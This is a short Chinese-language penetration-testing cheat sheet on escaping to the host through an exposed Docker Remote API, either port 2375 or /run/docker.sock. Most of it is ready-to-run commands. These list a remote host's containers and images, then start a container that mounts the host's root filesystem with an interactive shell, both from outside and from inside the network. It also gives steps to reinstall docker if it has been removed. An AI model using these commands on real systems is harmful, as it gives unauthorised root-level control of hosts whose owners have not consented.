# （存疑） Docker Remote api提权

#### docker提权

常见漏洞点： Docker Remote api\
识别点：2375端口，/run/docker.sock，可以看到宿主的容器

```python
 /run/docker.sock
 docker ps    ------如果显示了宿主机的docker，那么就存在漏洞
```

**2375开放（外网直接打）**

```python
docker -H tcp://192.168.52.128:2375 images    --查看容器组
docker -H tcp://192.168.52.128:2375 ps      --查看正在运行的容器
docker -H tcp://192.168.52.128:2375 run --rm -it -v /:/tmp/1/ wordpress /bin/bash
挂载宿主目录
```

**2375端口不开放（内网机器开搞）**

```python
挂载宿主机到docker上
docker run --rm -it -v /:/tmp/1/ wordpress /bin/bash
或
docker run -v /:/host -t -i bash
```

如果docker被卸载

```python
vim /etc/apt/sources.list
apt-get update
apt-get install docker.io
```
